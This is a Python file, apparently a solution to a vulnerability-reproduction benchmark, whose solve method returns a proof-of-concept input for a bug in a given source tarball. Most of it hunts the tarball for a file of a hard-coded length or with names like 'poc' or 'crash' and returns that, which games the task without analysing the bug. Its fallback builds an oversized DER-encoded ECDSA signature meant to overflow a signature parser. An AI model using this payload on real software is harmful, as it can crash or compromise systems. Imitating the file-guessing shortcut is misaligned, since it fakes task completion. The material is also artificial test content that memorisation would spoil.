import os
import tarfile
import re
import stat


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        TARGET_LEN = 41798

        def extract_poc_from_tar(path: str):
            try:
                tf = tarfile.open(path, 'r:*')
            except tarfile.ReadError:
                return None
            try:
                members = [m for m in tf.getmembers() if m.isfile() and m.size > 0]
                if not members:
                    return None

                # 1) Exact size match
                exact = [m for m in members if m.size == TARGET_LEN]
                if exact:
                    kw = re.compile(r'(poc|crash|repro|bug|id_|input)', re.I)
                    exact.sort(
                        key=lambda m: (
                            0 if kw.search(m.name or "") else 1,
                            len(m.name or ""),
                            m.name or "",
                        )
                    )
                    f = tf.extractfile(exact[0])
                    if f is not None:
                        try:
                            return f.read()
                        finally:
                            f.close()

                # 2) Keyword-based candidates
                kw2 = re.compile(r'(poc|crash|repro|bug|id_|sig|ecdsa)', re.I)
                cand = [m for m in members if kw2.search(m.name or "")]
                if cand:
                    cand.sort(
                        key=lambda m: (
                            abs(m.size - TARGET_LEN),
                            -m.size,
                        )
                    )
                    f = tf.extractfile(cand[0])
                    if f is not None:
                        try:
                            return f.read()
                        finally:
                            f.close()

                # 3) Fallback: nearest size
                members.sort(key=lambda m: (abs(m.size - TARGET_LEN), -m.size))
                f = tf.extractfile(members[0])
                if f is not None:
                    try:
                        return f.read()
                    finally:
                        f.close()
            finally:
                tf.close()
            return None

        def extract_poc_from_dir(path: str):
            candidates = []
            for root, dirs, files in os.walk(path):
                for name in files:
                    fpath = os.path.join(root, name)
                    try:
                        st = os.stat(fpath)
                    except OSError:
                        continue
                    if not stat.S_ISREG(st.st_mode) or st.st_size <= 0:
                        continue
                    rel = os.path.relpath(fpath, path)
                    candidates.append((rel, fpath, st.st_size))
            if not candidates:
                return None

            # 1) Exact size match
            exact = [c for c in candidates if c[2] == TARGET_LEN]
            if exact:
                kw = re.compile(r'(poc|crash|repro|bug|id_|input)', re.I)
                exact.sort(
                    key=lambda c: (
                        0 if kw.search(c[0]) else 1,
                        len(c[0]),
                        c[0],
                    )
                )
                with open(exact[0][1], "rb") as f:
                    return f.read()

            # 2) Keyword-based candidates
            kw2 = re.compile(r'(poc|crash|repro|bug|id_|sig|ecdsa)', re.I)
            cand = [c for c in candidates if kw2.search(c[0])]
            if cand:
                cand.sort(
                    key=lambda c: (
                        abs(c[2] - TARGET_LEN),
                        -c[2],
                    )
                )
                with open(cand[0][1], "rb") as f:
                    return f.read()

            # 3) Fallback: nearest size
            candidates.sort(key=lambda c: (abs(c[2] - TARGET_LEN), -c[2]))
            with open(candidates[0][1], "rb") as f:
                return f.read()

        data = None
        if os.path.isfile(src_path):
            data = extract_poc_from_tar(src_path)
        elif os.path.isdir(src_path):
            data = extract_poc_from_dir(src_path)

        if data is not None:
            return data

        # Fallback: construct a synthetic oversized ASN.1 DER-encoded ECDSA signature
        TARGET_LEN_LOCAL = TARGET_LEN

        if TARGET_LEN_LOCAL >= 12 and (TARGET_LEN_LOCAL - 12) % 2 == 0:
            N = (TARGET_LEN_LOCAL - 12) // 2
            if N > 0xFFFF:
                N = 0xFFFF
        else:
            approx = (TARGET_LEN_LOCAL - 12) // 2 if TARGET_LEN_LOCAL > 12 else 72
            if approx < 1:
                approx = 1
            if approx > 0xFFFF:
                approx = 0xFFFF
            N = approx

        body_len = 8 + 2 * N  # length of R+S part
        hi = (body_len >> 8) & 0xFF
        lo = body_len & 0xFF

        out = bytearray()

        # SEQUENCE header
        out.append(0x30)
        out.append(0x82)
        out.append(hi)
        out.append(lo)

        # INTEGER r
        out.append(0x02)
        out.append(0x82)
        rhi = (N >> 8) & 0xFF
        rlo = N & 0xFF
        out.append(rhi)
        out.append(rlo)
        out.extend(b"\x41" * N)

        # INTEGER s
        out.append(0x02)
        out.append(0x82)
        shi = (N >> 8) & 0xFF
        slo = N & 0xFF
        out.append(shi)
        out.append(slo)
        out.extend(b"\x42" * N)

        return bytes(out)
